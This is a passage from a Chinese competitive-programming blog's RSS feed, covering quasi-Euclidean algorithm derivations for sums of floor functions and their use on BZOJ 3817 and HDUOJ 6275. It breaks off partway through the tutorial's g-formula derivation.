<p>接下来我们就只需要考虑 <span class="math inline">\(c &gt; d\)</span> 的情况了。如果此时 <span class="math inline">\(\frac{a}{b}\)</span> 和 <span class="math inline">\(\frac{c}{d}\)</span> 间存在正整数，那么直接回溯即可。如果不存在，考虑对问题进行如下变换从而尽量缩小 <span class="math inline">\(a\)</span>：</p>
<p><span class="math display">\[
\begin{aligned}
&amp; \frac{a}{b} &lt; \frac{p}{q} &lt; \frac{c}{d} \\
&amp; \Rightarrow \frac{a}{b} - \left\lfloor \frac{a}{b} \right\rfloor &lt; \frac{p}{q} -\left\lfloor \frac{a}{b} \right\rfloor &lt; \frac{c}{d} - \left\lfloor \frac{a}{b} \right\rfloor \\
&amp; \Rightarrow \frac{a - b\left\lfloor \frac{a}{b} \right\rfloor}{b} &lt; \frac{p - q\left\lfloor \frac{a}{b} \right\rfloor}{q} &lt; \frac{c - d\left\lfloor \frac{a}{b} \right\rfloor}{d} \\
&amp; \Rightarrow \frac{a \bmod b}{b} &lt; \frac{p - q\left\lfloor \frac{a}{b} \right\rfloor}{q} &lt; \frac{c - d\left\lfloor \frac{a}{b} \right\rfloor}{d} \\
\end{aligned}
\]</span></p>
<p>由此对子问题 <span class="math inline">\(f(a \bmod b, b, c - d\left\lfloor \frac{a}{b} \right\rfloor, d) = \langle p&#39;&#39;, q&#39;&#39; \rangle\)</span> 求解，并在回溯的时候令 <span class="math inline">\(p = p&#39;&#39; + q&#39;&#39;\left\lfloor \frac{a}{b} \right\rfloor, q = q&#39;&#39;\)</span> 即可。</p>
<p>这就跟欧几里德算法很类似了…… 每常数步我们都可以将 <span class="math inline">\(a\)</span> 的规模缩小至 <span class="math inline">\(a \bmod b\)</span>，故复杂度为 <span class="math inline">\(\mathcal{O}(\log{n})\)</span>。不过为了防止中间爆 <code>int64</code> 我们在运算过程中可以约一下分，这样复杂度就变成了 <span class="math inline">\(\mathcal{O}(\log^2{n})\)</span>。</p>
<p>最后附上我的 <a href="https://github.com/codgician/Competitive-Programming/blob/master/BZOJ/2187/quasi_euclidean.cpp">代码</a> 以供参考。</p>
</div>
]]></content>
		</item>
		
		<item>
			<title>BZOJ 3817: Sum</title>
			<link>https://codgician.me/zh-hans/posts/2018/10/bzoj-3817/</link>
			<pubDate>Sun, 28 Oct 2018 13:27:56 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/10/bzoj-3817/</guid>
			<description>题面 分析 %%% 题面 给定正整数 \(n, r\)，试求： \[ \sum\limits_{d = 1}^{n} (-1)^{\left\lfloor \sqrt{d \cdot r \cdot d} \right\rfloor} \] 数据范围：\(n \le 10^9, \ r \le 10^4\)，测试数据组数 \(T \le 10^4\)。 题目链</description>
			<content type="html"><![CDATA[
<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>

<div id="TOC">
<ul>
<li><a href="#题面">题面</a></li>
<li><a href="#分析">分析</a></li>
<li><a href="#section">%%%</a></li>
</ul>
</div>

<div id="题面" class="section level1">
<h1>题面</h1>
<p>给定正整数 <span class="math inline">\(n, r\)</span>，试求：</p>
<p><span class="math display">\[
\sum\limits_{d = 1}^{n} (-1)^{\left\lfloor \sqrt{d \cdot r \cdot d} \right\rfloor}
\]</span></p>
<p><strong>数据范围</strong>：<span class="math inline">\(n \le 10^9, \ r \le 10^4\)</span>，测试数据组数 <span class="math inline">\(T \le 10^4\)</span>。</p>
<p><strong>题目链接</strong>：<a href="https://darkbzoj.tk/problem/3817">BZOJ 3817: Sum</a></p>
</div>
<div id="分析" class="section level1">
<h1>分析</h1>
<p>首先不难考虑到，如果 <span class="math inline">\(\sqrt{r}\)</span> 是有理数（整数）的话，这个问题非常好解决：</p>
<ul>
<li>若 <span class="math inline">\(\sqrt{r}\)</span> 为偶数，则原式答案显然为 <span class="math inline">\(n\)</span>；</li>
<li>若 <span class="math inline">\(\sqrt{r}\)</span> 为奇数，则：
<ul>
<li>若 <span class="math inline">\(n\)</span> 为偶数，则 <span class="math inline">\(-1\)</span> 与 <span class="math inline">\(1\)</span> 个数相等，原式答案为 <span class="math inline">\(0\)</span>；</li>
<li>若 <span class="math inline">\(n\)</span> 为奇数，则 <span class="math inline">\(-1\)</span> 比 <span class="math inline">\(1\)</span> 个数多一个，原式答案为 <span class="math inline">\(1\)</span>；</li>
</ul></li>
</ul>
<hr />
<p>接下来讨论 <span class="math inline">\(\sqrt{r}\)</span> 是无理数的情况。我们不妨令 <span class="math inline">\(t = \sqrt{r}\)</span>。</p>
<p>首先，显而易见地：</p>
<ul>
<li>若 <span class="math inline">\(\left\lfloor dt \right\rfloor\)</span> 为偶数，则 <span class="math inline">\((-1)^{\left\lfloor dt \right\rfloor} = 1\)</span>；</li>
<li>若 <span class="math inline">\(\left\lfloor dt \right\rfloor\)</span> 为奇数，则 <span class="math inline">\((-1)^{\left\lfloor dt \right\rfloor} = -1\)</span>；</li>
</ul>
<p>可以归纳出：</p>
<p><span class="math display">\[
(-1)^{\left\lfloor dt \right\rfloor} = 1 - 2\left( \left\lfloor dt \right\rfloor - 2\left\lfloor \frac{\left\lfloor dt \right\rfloor}{2} \right\rfloor \right)
\]</span></p>
<p>那么：</p>
<p><span class="math display">\[
\begin{aligned}
\sum\limits_{d = 1}^{n} (-1)^{\left\lfloor \sqrt{d \cdot r \cdot d} \right\rfloor}
= &amp; \sum\limits_{d = 1}^{n} \left[ 1 - 2\left( \left\lfloor dt \right\rfloor - 2\left\lfloor \frac{dt}{2} \right\rfloor \right) \right] \\
= &amp; n - 2\sum\limits_{d = 1}^{n} \left\lfloor dt \right\rfloor + 4\sum\limits_{d = 1}^{n} \left\lfloor \frac{dt}{2} \right\rfloor
\end{aligned}
\]</span></p>
<p>至于为什么对于实数 <span class="math inline">\(n\)</span> 有 <span class="math inline">\(\left\lfloor \frac{\left\lfloor n \right\rfloor}{2} \right\rfloor = \left\lfloor \frac{n}{2} \right\rfloor\)</span>，简单想想就明白了，本文不再给出证明。</p>
<hr />
<p>后两项均可记作 <span class="math inline">\(\sum\limits_{d = 1}^{n} \left\lfloor k \cdot d \right\rfloor\)</span> 的形式，其中 <span class="math inline">\(k = \frac{at + b}{c}\)</span>（<span class="math inline">\(a, b, c\)</span> 均为整数，而 <span class="math inline">\(t = \sqrt{r}\)</span> 是无理数）。这就显得跟类欧几里得可解决的问题很相似了。我们尝试仿照之前一篇博文 <a href="https://codgician.me/zh-hans/posts/2018/10/quasi-euclidean-algorithm/">浅谈类欧几里德算法</a> 里的推导方法对下面的式子进行推导（为了符合一般习惯下面一段中把 <span class="math inline">\(d\)</span> 写作 <span class="math inline">\(i\)</span>）：</p>
<p><span class="math display">\[
f(a, b, c, n) = \sum\limits_{i = 0}^{n} \left\lfloor i \cdot \frac{at + b}{c} \right\rfloor
\]</span></p>
<p>令 <span class="math inline">\(k = \frac{at + b}{c}\)</span>。</p>
<ul>
<li><p>若 <span class="math inline">\(k \ge1\)</span>（即满足对所有 <span class="math inline">\(i\)</span> 均有 <span class="math inline">\(\left\lfloor ki \right\rfloor &gt; 0\)</span>） ：
<span class="math display">\[
\begin{aligned}
f(a, b, c, n) = &amp; \sum\limits_{i = 0}^{n} \left\lfloor i \cdot \frac{at + b}{c} \right\rfloor \\
= &amp; \sum\limits_{i = 0}^{n} \left\lfloor i \cdot ( \left\lfloor \frac{at + b}{c} \right\rfloor + \frac{at + b}{c} - \left\lfloor \frac{at + b}{c} \right\rfloor ) \right\rfloor \\
= &amp; \left\lfloor \frac{at + b}{c} \right\rfloor \sum\limits_{i = 0}^{n} i + \sum\limits_{i = 0}^{n} \left\lfloor i \cdot \frac{at + b - c \left\lfloor \frac{at + b}{c} \right\rfloor}{c} \right\rfloor \\
= &amp; \left\lfloor \frac{at + b}{c} \right\rfloor \frac{1}{2}n(n + 1) + f(a, b - c \left\lfloor \frac{at + b}{c} \right\rfloor, c, n)
\end{aligned}
\]</span></p></li>
<li><p>若 <span class="math inline">\(k &lt; 1\)</span>（即不满足对所有 <span class="math inline">\(i\)</span> 均有 <span class="math inline">\(\left\lfloor ki \right\rfloor &gt; 0\)</span>）：</p></li>
</ul>
<p><span class="math display">\[
  \begin{aligned}
  f(a, b, c, n) &amp; = \sum\limits_{i = 0}^{n} \left\lfloor ki \right\rfloor \\
  &amp; = \sum\limits_{i = 0}^{n} \sum\limits_{j = 0}^{\left\lfloor ki \right\rfloor - 1} 1 \\
  &amp; = \sum\limits_{j = 0}^{\left\lfloor kn \right\rfloor - 1} \sum\limits_{i = 0}^{n} (j \le \left\lfloor ki \right\rfloor - 1) \\
  &amp; = \sum\limits_{j = 0}^{\left\lfloor kn \right\rfloor - 1} \sum\limits_{i = 0}^{n} (j &lt; ki - 1) \\
  &amp; = \sum\limits_{j = 0}^{\left\lfloor kn \right\rfloor - 1} \sum\limits_{i = 0}^{n} (i &gt; \frac{j + 1}{k}) \\
  &amp; = \sum\limits_{j = 0}^{\left\lfloor kn \right\rfloor - 1} (n - \left\lfloor \frac{j + 1}{k} \right\rfloor) \\
  &amp; \text{let } m = \left\lfloor kn \right\rfloor \\
  &amp; = \sum\limits_{j = 0}^{m - 1} (n - \left\lfloor \frac{j + 1}{k} \right\rfloor) \\
  &amp; = nm - \sum\limits_{j = 0}^{m - 1} \left\lfloor \frac{j + 1}{k} \right\rfloor \\
  &amp; = nm - \sum\limits_{j = 0}^{m - 1} \left\lfloor (j + 1) \cdot \frac{c}{at + b} \right\rfloor \\
  &amp; = nm - \sum\limits_{j = 0}^{m} \left\lfloor j \cdot \frac{c}{at + b} \right\rfloor \\
  \end{aligned}
\]</span></p>
<p>我们注意到最后一项已经比较类似于 <span class="math inline">\(f\)</span> 式的定义，我们需要对其进行分母有理化：</p>
<p><span class="math display">\[
\begin{aligned}
f(a, b, c, n) = &amp; nm - \sum\limits_{j = 0}^{m} \left\lfloor j \cdot \frac{act - bc}{a^2t^2 - b^2} \right\rfloor \\
= &amp; nm - f(ac, -bc, a^2t^2 - b^2, m)
\end{aligned}
\]</span></p>
<hr />
<p>对其简要总结（令 <span class="math inline">\(m = \left\lfloor n \cdot \frac{at + b}{c} \right\rfloor\)</span>）：</p>
<p><span class="math display">\[
f(a, b, c, n) =
\begin{cases}
\left\lfloor \frac{at + b}{c} \right\rfloor \frac{1}{2}n(n + 1) + f(a, b - c \left\lfloor \frac{at + b}{c} \right\rfloor, c, n) &amp; \frac{at + b}{c} \ge 1 \\
nm - f(ac, -bc, a^2t^2 - b^2, m) &amp; \frac{at + b}{c} &lt; 1 \\
\end{cases}
\]</span></p>
<p>就按照类欧的样子递归实现就好了。数学妙啊~ 复杂度为 <span class="math inline">\(\mathcal{O}(\log{n})\)</span>。</p>
<p>为了防止中间过程爆 <code>int64</code> 需要在每一步的时候对 <span class="math inline">\(\frac{at + b}{c}\)</span> 约分。但是由此一来复杂度就变成 <span class="math inline">\(\mathcal{O}(\log^2{n})\)</span>了 QAQ… 最后附上 <a href="https://github.com/codgician/Competitive-Programming/blob/master/BZOJ/3817/quasi_euclidean.cpp">我的代码</a> 以供参考。</p>
</div>
<div id="section" class="section level1">
<h1>%%%</h1>
<ul>
<li>u014609452 - <a href="https://blog.csdn.net/u014609452/article/details/52343533">类欧几里得算法 数论 BZOJ 3817 Sum</a></li>
<li>Y-E-T-I - <a href="https://www.cnblogs.com/Y-E-T-I/p/8435828.html">BZOJ 3817 Sum</a></li>
</ul>
</div>
]]></content>
		</item>
		
		<item>
			<title>HDUOJ 6275: Mod, Xor and Everything</title>
			<link>https://codgician.me/zh-hans/posts/2018/10/hduoj-6275/</link>
			<pubDate>Thu, 25 Oct 2018 18:10:23 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/10/hduoj-6275/</guid>
			<description>题面 分析 %%% 题面 对于给定的 \(n\)，计算： \[ (n \bmod 1) \oplus (n \bmod 2) \oplus \dots \oplus [n \bmod (n - 1)] \] 其中 \(\oplus\) 表示按位异或。 数据范围： \(n \le 10^{12}\) 题面链接：CCPC2018 Hangzhou</description>
			<content type="html"><![CDATA[
<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>

<div id="TOC">
<ul>
<li><a href="#题面">题面</a></li>
<li><a href="#分析">分析</a></li>
<li><a href="#section">%%%</a></li>
</ul>
</div>

<div id="题面" class="section level1">
<h1>题面</h1>
<p>对于给定的 <span class="math inline">\(n\)</span>，计算：</p>
<p><span class="math display">\[
(n \bmod 1) \oplus (n \bmod 2) \oplus \dots \oplus [n \bmod (n - 1)]
\]</span></p>
<p>其中 <span class="math inline">\(\oplus\)</span> 表示按位异或。</p>
<p><strong>数据范围</strong>： <span class="math inline">\(n \le 10^{12}\)</span></p>
<p><strong>题面链接</strong>：<a href="http://acm.hdu.edu.cn/downloads/CCPC2018-Hangzhou-ProblemSet.pdf">CCPC2018 Hangzhou Problemset</a>（L 题）</p>
<p><strong>提交链接</strong>：<a href="http://acm.hdu.edu.cn/showproblem.php?pid=6275">HDUOJ 6275: Mod, Xor and Everything</a></p>
<p>由于 HDUOJ 卡常丧心病狂，建议读者前往 <a href="https://loj.ac/problem/6344">LibreOJ 6344: 异或和</a> 提交（注意输入格式略微存在出入）。</p>
</div>
<div id="分析" class="section level1">
<h1>分析</h1>
<p>对于异或运算，我们不妨依据位运算的位独立性对于其二进制下的每一位逐位考虑。</p>
<p>对于数 <span class="math inline">\(n\)</span>，其二进制第 <span class="math inline">\(k\)</span> 位上的值为：</p>
<p><span class="math display">\[
\left\lfloor \frac{n}{2^k} \right\rfloor \pmod 2
\]</span></p>
<p>那么，对于第 <span class="math inline">\(k\)</span> 位，经过题目中异或运算后这一位上的答案为：</p>
<p><span class="math display">\[
\sum\limits_{i = 1}^{n} \left\lfloor \frac{n \bmod i}{2^k} \right\rfloor \pmod 2
\]</span></p>
<p>我们对其做一点小小的变换：</p>
<p><span class="math display">\[
\begin{aligned}
&amp; \sum\limits_{i = 1}^{n} \left\lfloor \frac{n \bmod i}{2^k} \right\rfloor \pmod 2 \\
= &amp; \sum\limits_{i = 1}^{n} \left\lfloor \frac{n - \left\lfloor \frac{n}{i} \right\rfloor i}{2^k} \right\rfloor \pmod 2
\end{aligned}
\]</span></p>
<p>我们发现这个式子非常类似于类欧几里德可解决的 <span class="math inline">\(f\)</span> 式子（有一点不一样，但是后文会通过一些变换使其一样）。有关类欧几里德算法的相关内容可参考我的另一篇博客：<a href="https://codgician.me/zh-hans/posts/2018/10/quasi-euclidean-algorithm/">浅谈类欧几里德算法</a>。</p>
<p>至于 <span class="math inline">\(\left\lfloor \frac{n}{i} \right\rfloor\)</span>，我们可以对其进行整除分块。</p>
<p>对于满足 <span class="math inline">\(\left\lfloor \frac{n}{i} \right\rfloor = t\)</span> 的某一块，我们记块的最左端为 <span class="math inline">\(l\)</span>，最右端为 <span class="math inline">\(r\)</span>，显然有：</p>
<p><span class="math display">\[
\left\lfloor \frac{n}{l} \right\rfloor = \left\lfloor \frac{n}{r} \right\rfloor = t
\]</span></p>
<p>以及：</p>
<p><span class="math display">\[
\begin{aligned}
n \bmod r &amp; = n - \left\lfloor \frac{n}{r} \right\rfloor r \\
&amp; = n - tr \\
\end{aligned}
\]</span></p>
<p>那么对于这一块内求和：</p>
<p><span class="math display">\[
\begin{aligned}
\sum\limits_{i = l}^{r} \left\lfloor \frac{-ti + n}{2^k} \right\rfloor = &amp; \sum\limits_{i = -r}^{-l} \left\lfloor \frac{ti + n}{2^k} \right\rfloor \\
= &amp; \sum\limits_{i = 0}^{r - l} \left\lfloor \frac{t(i - r) + n}{2^k} \right\rfloor \\
= &amp; \sum\limits_{i = 0}^{r - l} \left\lfloor \frac{ti + (n - tr)}{2^k} \right\rfloor \\
= &amp; \sum\limits_{i = 0}^{r - l} \left\lfloor \frac{ti + (n \bmod r)}{2^k} \right\rfloor \\
= &amp; f(t, n \bmod r, 2^k, r - l)
\end{aligned}
\]</span></p>
<p>简而言之，我们首先通过整除分块得到每一块的 <span class="math inline">\(l\)</span> 和 <span class="math inline">\(r\)</span>，并求出这一段中每一位对应的结果，最后将所有段的结果求和并将不同位“组装”起来就是最终答案了。</p>
<p>复杂度：<span class="math inline">\(\mathcal{O}(\sqrt{n}\log{n})\)</span>。</p>
<hr />
<p>这道题卡常呜呜呜。</p>
<p>在 <span class="math inline">\(n\)</span> 比较小的时候，<span class="math inline">\(\mathcal{O}(n)\)</span> 暴力是比类欧 <span class="math inline">\(\mathcal{O}(\sqrt{n}\log{n})\)</span> 跑得还要快的…… 故考虑设定一个阈值 <span class="math inline">\(lim\)</span>，当 <span class="math inline">\(i\)</span> 不大于 <span class="math inline">\(lim\)</span> 的时候跑暴力，大于 <span class="math inline">\(lim\)</span> 的时候跑类欧。对于本弱写的代码，实测得到 <span class="math inline">\(lim\)</span> 大致取值在 <span class="math inline">\(2 \times 10^7 \sim 4 \times 10^7\)</span> 范围内时可以在 HDUOJ 上卡进时限。而在 LibreOJ 上这个范围就要宽很多了。</p>
<p>最后附上 <a href="https://github.com/codgician/Competitive-Programming/blob/master/HDUOJ/6275/quasi_euclidean.cpp">我的代码</a> 以供参考。</p>
</div>
<div id="section" class="section level1">
<h1>%%%</h1>
<ul>
<li>rzO_KQP_Orz - <a href="https://blog.csdn.net/rzO_KQP_Orz/article/details/83120181?utm_source=blogxgwz0">【hdu6275】【2017ccpc杭州L】Mod, Xor and Everything 题解</a></li>
</ul>
</div>
]]></content>
		</item>
		
		<item>
			<title>浅谈类欧几里德算法</title>
			<link>https://codgician.me/zh-hans/posts/2018/10/quasi-euclidean-algorithm/</link>
			<pubDate>Thu, 18 Oct 2018 22:54:39 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/10/quasi-euclidean-algorithm/</guid>
			<description>pre code.sourceCode { white-space: pre; position: relative; } pre code.sourceCode span { display: inline-block; line-height: 1.25; } pre code.sourceCode span:empty { height: 1.2em; } code.sourceCode span { color: inherit; text-decoration: inherit; } div.sourceCode { margin: 1em 0; } pre.sourceCode { margin: 0; } @media screen { div.sourceCode { overflow: auto; } } @media print { pre code.sourceCode { white-space: pre-wrap; } pre code.sourceCode span { text-indent: -5em; padding-left: 5em; }</description>
			<content type="html"><![CDATA[
<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>
<style type="text/css">
pre > code.sourceCode { white-space: pre; position: relative; }
pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
pre > code.sourceCode > span:empty { height: 1.2em; }
code.sourceCode > span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre > code.sourceCode { white-space: pre-wrap; }
pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code > span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code > span > a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
  }
pre.numberSource { margin-left: 3em;  padding-left: 4px; }
div.sourceCode
  { color: #cccccc; background-color: #303030; }
@media screen {
pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ffcfaf; } /* Alert */
code span.an { color: #7f9f7f; font-weight: bold; } /* Annotation */
code span.at { } /* Attribute */
code span.bn { color: #dca3a3; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #f0dfaf; } /* ControlFlow */
code span.ch { color: #dca3a3; } /* Char */
code span.cn { color: #dca3a3; font-weight: bold; } /* Constant */
code span.co { color: #7f9f7f; } /* Comment */
code span.cv { color: #7f9f7f; font-weight: bold; } /* CommentVar */
code span.do { color: #7f9f7f; } /* Documentation */
code span.dt { color: #dfdfbf; } /* DataType */
code span.dv { color: #dcdccc; } /* DecVal */
code span.er { color: #c3bf9f; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #c0bed1; } /* Float */
code span.fu { color: #efef8f; } /* Function */
code span.im { } /* Import */
code span.in { color: #7f9f7f; font-weight: bold; } /* Information */
code span.kw { color: #f0dfaf; } /* Keyword */
code span.op { color: #f0efd0; } /* Operator */
code span.ot { color: #efef8f; } /* Other */
code span.pp { color: #ffcfaf; font-weight: bold; } /* Preprocessor */
code span.sc { color: #dca3a3; } /* SpecialChar */
code span.ss { color: #cc9393; } /* SpecialString */
code span.st { color: #cc9393; } /* String */
code span.va { } /* Variable */
code span.vs { color: #cc9393; } /* VerbatimString */
code span.wa { color: #7f9f7f; font-weight: bold; } /* Warning */
</style>

<div id="TOC">
<ul>
<li><a href="#简介">简介</a></li>
<li><a href="#引理">引理</a></li>
<li><a href="#f-式">f 式</a>
<ul>
<li><a href="#形式">形式</a></li>
<li><a href="#推导">推导</a></li>
<li><a href="#结论">结论</a></li>
</ul></li>
<li><a href="#g-式">g 式</a>
<ul>
<li><a href="#形式-1">形式</a></li>
<li><a href="#推导-1">推导</a></li>
<li><a href="#结论-1">结论</a></li>
</ul></li>
<li><a href="#h-式">h 式</a>
<ul>
<li><a href="#形式-2">形式</a></li>
<li><a href="#推导-2">推导</a></li>
<li><a href="#结论-2">结论</a></li>
</ul></li>
<li><a href="#代码实现">代码实现</a>
<ul>
<li><a href="#仅-f-式">仅 f 式</a></li>
<li><a href="#f-g-h-式">f, g, h 式</a></li>
</ul></li>
<li><a href="#更通用的情况">更通用的情况</a></li>
<li><a href="#section">%%%</a></li>
</ul>
</div>

<blockquote>
<p>本文数学公式较长，建议在屏幕较大的设备上阅读。</p>
</blockquote>
<div id="简介" class="section level1">
<h1>简介</h1>
<p>类欧几里德算法即使用与欧几里德算法类似的思想解决一类求和式的计算问题。可用类欧几里德算法解决的求和式主要有以下三种：</p>
<p><span class="math display">\[
\begin{aligned}
f(a, b, c, n) &amp; = \sum\limits_{i = 0}^{n} {\left\lfloor \frac{ai + b}{c} \right\rfloor} \\
g(a, b, c, n) &amp; = \sum\limits_{i = 0}^{n} {i \left\lfloor \frac{ai + b}{c} \right\rfloor} \\
h(a, b, c, n) &amp; = \sum\limits_{i = 0}^{n} {\left\lfloor \frac{ai + b}{c} \right\rfloor}^2
\end{aligned}
\]</span></p>
<p>后文中将简称它们为 <span class="math inline">\(f\)</span> 式，<span class="math inline">\(g\)</span> 式与 <span class="math inline">\(h\)</span> 式。</p>
</div>
<div id="引理" class="section level1">
<h1>引理</h1>
<p>考虑 <span class="math inline">\(a, b, c\)</span> 均为非负整数。</p>
<p><span class="math display">\[
a \le \left\lfloor \frac{c}{b} \right\rfloor \Leftrightarrow ab \le c
\]</span></p>
<p>证明比较显然，这里就略去了。</p>
<hr />
<p><span class="math display">\[
a &lt; \left\lfloor \frac{c}{b} \right\rfloor \Leftrightarrow ab &lt; c - b + 1
\]</span></p>
<p>下面给出简略证明过程：</p>
<p><span class="math display">\[
\begin{aligned}
a &lt; \left\lfloor \frac{c}{b} \right\rfloor
&amp; \Leftrightarrow a \le \left\lfloor \frac{c}{b} \right\rfloor - 1 \\
&amp; \Leftrightarrow ab \le c - b \\
&amp; \Leftrightarrow ab &lt; c - b + 1
\end{aligned}
\]</span></p>
<hr />
<p><span class="math display">\[
\begin{aligned}
n^2
= &amp; 2 \cdot \frac{1}{2}(n - 1)n + n \\
= &amp; 2 \sum\limits_{i = 0}^{n - 1} {i} + n
\end{aligned}
\]</span></p>
<p>在后面的推导中可能会不加证明地使用上述三个结论。</p>
</div>
<div id="f-式" class="section level1">
<h1>f 式</h1>
<div id="形式" class="section level2">
<h2>形式</h2>
<p><span class="math display">\[
f(a, b, c, n) = \sum\limits_{i = 0}^{n} {\left\lfloor \frac{ai + b}{c} \right\rfloor}
\]</span></p>
</div>
<div id="推导" class="section level2">
<h2>推导</h2>
<p>首先我们考虑求和式中每一项都大于 <span class="math inline">\(0\)</span> 的情况，即当 <span class="math inline">\(a \ge c\)</span> 或 <span class="math inline">\(b \ge c\)</span> 时：</p>
<p><span class="math display">\[
\begin{aligned}
f(a, b, c, n)
&amp; = \sum\limits_{i = 0}^{n} {\left\lfloor \frac{ai + b}{c} \right\rfloor} \\
&amp; = \sum\limits_{i = 0}^{n} {\left[ \left\lfloor \frac{a}{c} \right\rfloor i + \left\lfloor \frac{b}{c} \right\rfloor + \left\lfloor \frac{(a \bmod c)i + (b \bmod c)}{c} \right\rfloor \right]} \\
&amp; = \left\lfloor \frac{a}{c} \right\rfloor \sum\limits_{i = 0}^{n} {i} + \left\lfloor \frac{b}{c} \right\rfloor \sum\limits_{i = 0}^{n} {1} + \sum\limits_{i = 0}^{n} {\left\lfloor \frac{(a \bmod c)i + (b \bmod c)}{c} \right\rfloor} \\
&amp; = \left\lfloor \frac{a}{c} \right\rfloor \frac{1}{2}n(n + 1) + \left\lfloor \frac{b}{c} \right\rfloor (n + 1) + f(a \bmod c, b \bmod c, c, n)
\end{aligned}
\]</span></p>
<p>接下来我们考虑存在某些项等于 <span class="math inline">\(0\)</span> 的情况，即当 <span class="math inline">\(a, b &lt; c\)</span> 时：</p>
<p><span class="math display">\[
\begin{aligned}
f(a, b, c, n)
&amp; = \sum\limits_{i = 0}^{n} {\left\lfloor \frac{ai + b}{c} \right\rfloor} \\
&amp; = \sum\limits_{i = 0}^{n} \sum\limits_{j = 0}^{\left\lfloor \frac{ai + b}{c} \right\rfloor - 1} {1} \\
&amp; = \sum_{j = 0}^{\left\lfloor \frac{an + b}{c} \right\rfloor - 1} \sum\limits_{i = 0}^{n} {(j \le \left\lfloor \frac{ai + b}{c} \right\rfloor - 1)} \\
&amp; = \sum_{j = 0}^{\left\lfloor \frac{an + b}{c} \right\rfloor - 1} \sum\limits_{i = 0}^{n} {(j &lt; \left\lfloor \frac{ai + b}{c} \right\rfloor)}
\end{aligned}
\]</span></p>
<p>我们不妨令 <span class="math inline">\(m = \left\lfloor \frac{an + b}{c} \right\rfloor\)</span>，则有：</p>
<p><span class="math display">\[
\begin{aligned}
f(a, b, c, n)
&amp; = \sum_{j = 0}^{m - 1} \sum\limits_{i = 0}^{n} {(j &lt; \left\lfloor \frac{ai + b}{c} \right\rfloor)} \\
&amp; = \sum_{j = 0}^{m - 1} \sum\limits_{i = 0}^{n} {\left[ cj &lt; (ai + b) - c + 1 \right]} \\
&amp; = \sum\limits_{j = 0}^{m - 1} \sum\limits_{i = 0}^{n} {(i &gt; \left\lfloor \frac{cj + c - b - 1}{a} \right\rfloor)}
\end{aligned}
\]</span></p>
<p>不难发现，<span class="math inline">\(\sum\limits_{i = 0}^{n} {(\left\lfloor \frac{cj + c - b - 1}{a} \right\rfloor &lt; i)}\)</span> 即为 <span class="math inline">\(n - \left\lfloor \frac{cj + c - b - 1}{a} \right\rfloor\)</span>。故有：</p>
<p><span class="math display">\[
\begin{aligned}
f(a, b, c, n)
&amp; = \sum\limits_{j = 0}^{m - 1} {(n - \left\lfloor \frac{cj + c - b - 1}{a} \right\rfloor)} \\
&amp; = nm - \sum\limits_{j = 0}^{m - 1} {\left\lfloor \frac{cj + c - b - 1}{a} \right\rfloor} \\
&amp; = nm - f(c, c - b - 1, a, m - 1)
\end{aligned}
\]</span></p>
<p>现在假设我们有 <span class="math inline">\(f(a, b, c, n)\)</span>，其中 <span class="math inline">\(a \ge c\)</span>。经过情况 <span class="math inline">\(1\)</span> 中的一次运算后 <span class="math inline">\((a, b, c, n)\)</span> 变为 <span class="math inline">\((a \bmod c, b \bmod c, c, n)\)</span>。此时我们再应用情况 <span class="math inline">\(2\)</span> 进行一次运算四个参数就变成了 <span class="math inline">\((c, c - b \bmod c - 1, a \bmod c, m - 1)\)</span>。我们注意观察第 <span class="math inline">\(1\)</span> 个参数和第 <span class="math inline">\(3\)</span> 个参数，经过上述两次运算后由 <span class="math inline">\((a, c)\)</span> 变成了 <span class="math inline">\((c, a \bmod c)\)</span>。这与欧几里德算法存在极大的相似之处，因此我们把这种算法称作类欧几里德算法。至于时间复杂度，显然也是与欧几里德算法相同的，为 <span class="math inline">\(\mathcal{O}(\log{n})\)</span> 级别。</p>
</div>
<div id="结论" class="section level2">
<h2>结论</h2>
<p>令 <span class="math inline">\(m = \left\lfloor \frac{an + b}{c} \right\rfloor\)</span>，有：</p>
<p><span class="math display">\[
f(a, b, c, n) =
\begin{cases}
\left\lfloor \frac{a}{c} \right\rfloor \frac{n(n + 1)}{2} + \left\lfloor \frac{b}{c} \right\rfloor (n + 1) &amp; \\
+ f(a \bmod c, b \bmod c, c, n) &amp; a \ge c \lor b \ge c \\
nm - f(c, c - b - 1, a, m - 1) &amp; \text{otherwise}
\end{cases}
\]</span></p>
</div>
</div>
<div id="g-式" class="section level1">
<h1>g 式</h1>
<div id="形式-1" class="section level2">
<h2>形式</h2>
<p><span class="math display">\[
g(a, b, c, n) = \sum\limits_{i = 0}^{n} {i \left\lfloor \frac{ai + b}{c} \right\rfloor}
\]</span></p>
</div>
<div id="推导-1" class="section level2">
<h2>推导</h2>
<p>若 <span class="math inline">\(a \ge c\)</span> 或 <span class="math inline">\(b \ge c\)</span>，有：</p>
<p><span class="math display">\[
\begin{aligned}
g(a, b, c, n) &amp; = \sum\limits_{i = 0}^{n} {i \left\lfloor \frac{ai + b}{c} \right\rfloor} \\
&amp; = \sum\limits_{i = 0}^{n} {i \cdot ( \left\lfloor \frac{a}{c} \right\rfloor i + \left\lfloor \frac{b}{c} \right\rfloor + \left\lfloor \frac{(a \bmod c)i + (b \bmod c)}{c} \right\rfloor)} \\
